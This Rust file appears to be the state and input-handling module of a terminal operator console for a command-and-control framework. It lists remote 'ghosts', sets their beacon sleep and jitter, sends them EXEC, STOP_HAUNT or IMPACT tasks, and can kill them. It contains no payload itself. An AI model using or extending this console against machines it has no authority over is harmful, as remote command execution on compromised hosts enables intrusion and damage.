use crate::client::{self, Ghost, Task};
use crossterm::event::KeyCode;
use ratatui::widgets::{ListState, TableState};
use tokio::sync::mpsc;

#[derive(PartialEq)]
pub enum AppState {
    Normal,
    Input,
    Help,
    ActionMenu,
    ConfirmModal
}

pub enum NetworkEvent {
    GhostsFetched(Result<Vec<Ghost>, String>),
    TasksFetched(Result<Vec<Task>, String>),
    TaskSent(Result<String, String>),
    GhostConfigUpdated(Result<String, String>),
    GhostKilled(Result<String, String>)
}

#[derive(PartialEq, Clone, Copy)]
pub enum ConfigField {
    Sleep,
    Jitter,
    Submit
}

pub struct ConfigFormState {
    pub selection: ConfigField,
    pub sleep_input: String,
    pub jitter_input: String
}

impl ConfigFormState {
    fn new() -> Self {
        Self {
            selection: ConfigField::Sleep,
            sleep_input: String::new(),
            jitter_input: String::new()
        }
    }
}

pub struct App {
    pub current_tab: usize, // 0 -> dashboard, 1 -> terminal, 2 -> config
    pub state: AppState,

    pub ghosts: Vec<Ghost>,
    pub ghost_table_state: TableState,
    pub selected_ghost_index: Option<usize>,

    pub tasks: Vec<Task>,
    pub task_list_state: ListState,
    pub input_buffer: String,

    pub config: ConfigFormState,

    pub should_scroll: bool,

    pub action_menu_index: usize,

    pub status_message: String,
    pub network_tx: mpsc::Sender<NetworkEvent>,
    pub network_rx: mpsc::Receiver<NetworkEvent>,

    pub tick_count: u64
}

impl App {
    pub fn new() -> Self {
        let (tx, rx) = mpsc::channel(10);
        let mut app = Self {
            current_tab: 0,
            state: AppState::Normal,
            ghosts: vec![],
            ghost_table_state: TableState::default(),
            selected_ghost_index: Some(0),
            tasks: vec![],
            task_list_state: ListState::default(),
            input_buffer: String::new(),
            config: ConfigFormState::new(),
            should_scroll: false,
            action_menu_index: 0,
            status_message: "READY press \'h\' for help".to_string(),
            network_tx: tx,
            network_rx: rx,
            tick_count: 0
        };
        
        app.refresh_ghosts();
        app
    }

    pub fn next_tab(&mut self) {
        self.current_tab = (self.current_tab + 1) % 4;
        self.handle_tab_change();
    }

    pub fn prev_tab(&mut self) {
        if self.current_tab > 0 {
            self.current_tab -= 1;
        } else {
            self.current_tab = 3;
        }

        self.handle_tab_change();
    }

    fn handle_tab_change(&mut self) {
        if self.current_tab == 1 {
            self.refresh_tasks();
            self.should_scroll = true;
        }

        self.state = AppState::Normal;
    }

    pub fn toggle_help(&mut self) {
        if self.state == AppState::Help {
            self.state = AppState::Normal;
        } else {
            self.state = AppState::Help;
        }
    }

    pub fn on_tick(&mut self) {
        self.tick_count += 1;

        // approx 5 seconds, doesn't need to be extremely accurate
        if self.tick_count % 50 == 0 {
            self.refresh_ghosts();
        }

        if self.current_tab == 1 && self.tick_count % 10 == 0 {
            self.refresh_tasks();
        }
    }

    pub fn submit_config(&mut self) {
        if let Some(idx) = self.selected_ghost_index {
            if let Some(ghost) = self.ghosts.get(idx) {
                let id = ghost.id.clone();
                let sleep = self.config.sleep_input.parse::<i64>().unwrap_or(60);
                let jitter = self.config.jitter_input.parse::<u8>().unwrap_or(10);

                let tx = self.network_tx.clone();
                tokio::spawn(async move {
                    let res = client::update_ghost_config(id, sleep, jitter).await;
                    let _ = tx.send(NetworkEvent::GhostConfigUpdated(res)).await;
                });

                self.status_message = "sending config update...".to_string();
            }
        }
    }

    pub fn refresh_ghosts(&mut self) {
        let tx = self.network_tx.clone();
        tokio::spawn(async move {
            let res = client::fetch_ghosts().await;
            let _ = tx.send(NetworkEvent::GhostsFetched(res)).await;
        });
    }

    pub fn refresh_tasks(&mut self) {
        if let Some(idx) = self.selected_ghost_index {
            if let Some(ghost) = self.ghosts.get(idx) {
                let id = ghost.id.clone();
                let tx = self.network_tx.clone();
                tokio::spawn(async move {
                    let res = client::fetch_tasks(id).await;
                    let _ = tx.send(NetworkEvent::TasksFetched(res)).await;
                });
            }
        }
    }

    pub fn send_current_command(&mut self) {
        if let Some(idx) = self.selected_ghost_index {
            if let Some(ghost) = self.ghosts.get(idx) {
                let id = ghost.id.clone();
                let full_command = self.input_buffer.trim().to_string();

                if full_command.is_empty() {
                    return;
                }

                let tx = self.network_tx.clone();

                let parts: Vec<&str> = full_command.splitn(2, ' ').collect();
                let first_token = parts[0];

                let (command, args) = match first_token {
                    "EXEC" | "STOP_HAUNT" | "IMPACT" => {
                        let arg_str = if parts.len() > 1 { parts[1].to_string() } else { String::new() };
                        (first_token.to_string(), arg_str)
                    },
                    _ => {
                        ("EXEC".to_string(), full_command)
                    }
                };

                tokio::spawn(async move {
                    let res = client::send_task(id, command, args).await;
                    let _ = tx.send(NetworkEvent::TaskSent(res)).await;
                });

                self.status_message = "sending task".to_string();
                self.input_buffer.clear();
                self.should_scroll = true;
            }
        }
    }

    pub fn kill_current_ghost(&mut self) {
        if let Some(idx) = self.selected_ghost_index {
            if let Some(ghost) = self.ghosts.get(idx) {
                let id = ghost.id.clone();
                let tx = self.network_tx.clone();

                tokio::spawn(async move {
                    let res = client::kill_ghost(id).await;
                    let _ = tx.send(NetworkEvent::GhostKilled(res)).await;
                });

                self.status_message = "sending kill signal...".to_string();
                self.state = AppState::Normal;
            }
        }
    }

    pub fn handle_network_message(&mut self, message: NetworkEvent) {
        match message {
            NetworkEvent::GhostsFetched(result) => match result {
                Ok(data) => {
                    self.ghosts = data;
                    if !self.ghosts.is_empty() && self.ghost_table_state.selected().is_none() {
                        self.ghost_table_state.select(Some(0));
                        self.selected_ghost_index = Some(0);
                    }

                    self.status_message = format!("UPDATED {} ghosts online", self.ghosts.len());
                },
                Err(e) => self.status_message = format!("[!] ERROR {}", e)
            },
            NetworkEvent::TasksFetched(result) => match result {
                Ok(data) => {
                    let new_count = data.len();
                    let old_count = self.tasks.len();

                    // if new task (if) or response (else if) then scroll
                    if new_count > old_count {
                        self.should_scroll = true;
                    } else if let (Some(new_last), Some(old_last)) = (data.last(), self.tasks.last()) {
                        if new_last.id == old_last.id && new_last.status != old_last.status {
                            self.should_scroll = true;
                        }
                    }

                    self.tasks = data;
                },
                Err(_) => {}
            },
            NetworkEvent::TaskSent(result) => match result {
                Ok(message) => {
                    self.status_message = format!("SUCCESS {}", message);
                    self.refresh_tasks();
                    self.should_scroll = true;
                },
                Err(e) => self.status_message = format!("ERROR {}", e)
            },
            NetworkEvent::GhostConfigUpdated(result) => match result {
                Ok(message) => self.status_message = format!("SUCCESS {}", message),
                Err(e) => self.status_message = format!("ERROR {}", e)
            },
            NetworkEvent::GhostKilled(result) => match result {
                Ok(message) => self.status_message = format!("SUCCESS {}", message),
                Err(e) => self.status_message = format!("ERROR {}", e)
            }
        }
    }

    pub fn handle_key(&mut self, key: KeyCode) {
        if self.state == AppState::ActionMenu || self.state == AppState::ConfirmModal {
            if let KeyCode::Esc = key {
                self.state = AppState::Normal;
                return;
            }
        }

        match key {
            KeyCode::Right => self.next_tab(),
            KeyCode::Left => self.prev_tab(),
            _ => match self.current_tab {
                0 => self.handle_dashboard_keys(key),
                1 => self.handle_terminal_keys(key),
                2 => self.handle_config_keys(key),
                // 3 => self.handle_builder_keys(key),
                _ => {}
            }
        }
    }

    pub fn handle_dashboard_keys(&mut self, key: KeyCode) {
        match self.state {
            AppState::Normal => {
                match key {
                    KeyCode::Down => self.next_ghost(),
                    KeyCode::Up => self.prev_ghost(),
                    KeyCode::Char('x') => {
                        if self.selected_ghost_index.is_some() && !self.ghosts.is_empty() {
                            self.state = AppState::ActionMenu;
                            self.action_menu_index = 0;
                        }
                    },
                    KeyCode::Enter => {
                        if self.selected_ghost_index.is_some() {
                            self.current_tab = 1;
                            self.refresh_tasks();
                            self.should_scroll = true;
                            self.state = AppState::Input;
                        }
                    },
                    _ => {}
                }
            },
            AppState::ActionMenu => {
                match key {
                    KeyCode::Up | KeyCode::Down => {
                        // cycle options if more arise
                    },
                    KeyCode::Enter => {
                        self.state = AppState::ConfirmModal;
                    },
                    _ => {}
                }
            },
            AppState::ConfirmModal => {
                match key {
                    KeyCode::Enter => {
                        match self.action_menu_index {
                            0 => self.kill_current_ghost(),
                            _ => {}
                        }
                    },
                    _ => {}
                }
            },
            _ => {}
        }
    }

    pub fn handle_terminal_keys(&mut self, key: KeyCode) {
        match key {
            KeyCode::Down => self.next_ghost(),
            KeyCode::Up => self.prev_ghost(),
            KeyCode::Char('i') => {
                self.state = AppState::Input;
            },
            _ => {}
        }
    }

    pub fn handle_config_keys(&mut self, key: KeyCode) {
        match key {
            KeyCode::Down | KeyCode::Tab => {
                self.config.selection = match self.config.selection {
                    ConfigField::Sleep => ConfigField::Jitter,
                    ConfigField::Jitter => ConfigField::Submit,
                    ConfigField::Submit => ConfigField::Sleep,
                }
            },
            KeyCode::Up => {
                self.config.selection = match self.config.selection {
                    ConfigField::Sleep => ConfigField::Submit,
                    ConfigField::Jitter => ConfigField::Sleep,
                    ConfigField::Submit => ConfigField::Jitter,
                }
            },
            KeyCode::Char(c) => {
                match self.config.selection {
                    ConfigField::Sleep => if c.is_numeric() { self.config.sleep_input.push(c); },
                    ConfigField::Jitter => if c.is_numeric() { self.config.jitter_input.push(c); },
                    _ => {}
                }
            },
            KeyCode::Backspace => {
                match self.config.selection {
                    ConfigField::Sleep => { self.config.sleep_input.pop(); },
                    ConfigField::Jitter => { self.config.jitter_input.pop(); },
                    _ => {}
                }
            },
            KeyCode::Enter => {
                if self.config.selection == ConfigField::Submit {
                    self.submit_config();
                } else {
                    // enter acts like tab if not on submit button
                    self.config.selection = match self.config.selection {
                        ConfigField::Sleep => ConfigField::Jitter,
                        _ => ConfigField::Submit
                    }
                }
            },
            _ => {}
        }
    }

    pub fn handle_input_mode(&mut self, key: crossterm::event::KeyEvent) {
        match key.code {
            KeyCode::Esc => self.state = AppState::Normal,
            KeyCode::Enter => {
                self.send_current_command();
            },
            KeyCode::Char(c) => self.input_buffer.push(c),
            KeyCode::Backspace => { self.input_buffer.pop(); },
            _ => {}
        }
    }

    pub fn next_ghost(&mut self) {
        let i = match self.ghost_table_state.selected() {
            Some(i) => if i >= self.ghosts.len().saturating_sub(1) { 0 } else { i + 1 },
            None => 0
        };

        self.ghost_table_state.select(Some(i));
        self.selected_ghost_index = Some(i);

        if self.current_tab == 1 {
            self.tasks.clear();
            self.refresh_tasks();
            self.should_scroll = true;
        }
    }

    pub fn prev_ghost(&mut self) {
        let i = match self.ghost_table_state.selected() {
            Some(i) => if i == 0 { self.ghosts.len().saturating_sub(1) } else { i - 1 },
            None => 0
        };

        self.ghost_table_state.select(Some(i));
        self.selected_ghost_index = Some(i);

        if self.current_tab == 1 {
            self.tasks.clear();
            self.refresh_tasks();
            self.should_scroll = true;
        }
    }
}
